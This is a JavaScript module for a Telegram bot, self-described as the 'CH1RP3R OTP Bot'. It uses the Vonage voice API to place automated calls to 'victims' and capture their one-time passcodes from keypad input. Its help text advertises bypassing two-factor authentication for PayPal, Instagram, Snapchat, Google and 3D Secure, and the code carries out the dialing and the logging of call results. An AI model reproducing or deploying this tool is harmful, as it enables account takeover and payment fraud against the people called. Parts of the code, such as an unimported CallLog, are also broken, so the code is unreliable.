const NexmoHelperError = require('./NexmoHelperError');
const uuidV1 = require('uuid/v1');

const HELP_MSG = `
Bypass SMS verifications from:

1.Paypal 
2.Instagram 
3.Snapchat
4.Google 
5.3D Secure, and many others... using CH1RP3R OTP Bot or the private API.

Help, Commands & Informations

- /call  [phone_number1] [phone_number2]:- Initiates an otp call.
- /help :- displays this help message.

I presently only support otp calling for 2fa authentication bypass. You can create a otp call by using the /call command and listing the phone numbers of the victims you'd like to get otp from. 
For example,

- /call otp 14155550123 14155550456 would call both of those numbers for otp and acquire the otp code from there dtmf input.`;

class NexmoHelper {
  static HELP_MSG = HELP_MSG;

  constructor(bot, vonage, config) {
    this.supportedIntents = {
      'conference': this._conferenceIntent,
      'otp': this._conferenceIntent
    };

    this.bot = bot;
    this.vonage = vonage;
    this.config = config;
  }

  async handleMessage(message) {
    if (!message.tokens || message.tokens.length === 0) {
      throw new NexmoHelperError(`Message does not contain any valid command.`);
    }

    const intentToken = message.tokens[0];
    const intent = this.supportedIntents[intentToken];

    if (!intent) {
      await this.bot.api.sendMessage(message.channel, `<b>[WARNING!]⚠️:</b> Sorry, unsupported command: ${intentToken}. ${HELP_MSG}`, {
        parse_mode: 'HTML',
      });
    } else {
      await intent.call(this, message);
    }
  }

  async _conferenceIntent(message) {
    if (message.tokens.length < 2) {
      throw new NexmoHelperError(`"call" command requires tokens for call participants. For example, phone numbers.`);
    }

    const usersToDialIn = {};

    message.tokens.forEach((token) => {
      if (/\d+/.test(token)) {
        usersToDialIn[token] = { phoneNumber: token };
      } else {
        console.log(`Ignoring token "${token}"`);
      }
    });

    let telegramResponse = `The following client will be called: ${Object.keys(usersToDialIn).join(', ')}`;
    await this.bot.api.sendMessage(message.channel, telegramResponse, {
      parse_mode: 'HTML',
    });

    this._conferenceUsers(usersToDialIn, (callResults) => {
      console.log(callResults);
    }, message)
  }

  _conferenceUsers(users, callback, message) {
    const callResults = [];
    const conferenceId = `telegram_conf_${uuidV1()}`;

    Object.keys(users).forEach((userId) => {
      this._makeCall(conferenceId, userId, (result) => {
        callResults.push(result);
        const callLog = new CallLog({
          conferenceId,
          phoneNumber: userId,
          status: result.success ? 'success' : 'failed',
          dtmfInput: [],
          responses: []
        });
        callLog.save().catch(err => console.error('Error saving call log:', err));
      }, message)
    });

    callback(callResults);
  }

   _makeCall(conferenceId, phoneNumber, callback, message) {
    this.bot.api.sendMessage(message.channel, '<b>Calling Client</b> 📞 ' + phoneNumber, {
      parse_mode: 'HTML',
    });
    
    const answerUrl = `${this.config.BASE_URL}/answer?conference_id=${conferenceId}`;
    let callResult = { success: null, error: null };
    
    this.vonage.voice.createOutboundCall({
      to: [{
        type: 'phone',
        number: phoneNumber
      }],
      from: {
        type: 'phone',
        number: this.config.CALLER_ID[0] // use first configured number
      },
      answer_url: [answerUrl]
    }, (error, result) => {
      if (error) {
        callResult.error = error;
        if (error.statusCode === 429) {
          const backOffMillis = error.headers['retry-after'];
          console.log(`429 response returned. retrying after ${backOffMillis} seconds`);
          setTimeout(() => {
            this._makeCall(conferenceId, phoneNumber, callback);
          }, backOffMillis);
        }
      } else {
        callResult.success = result;
      }
      callback(callResult);
    });
  }
}

module.exports = NexmoHelper;
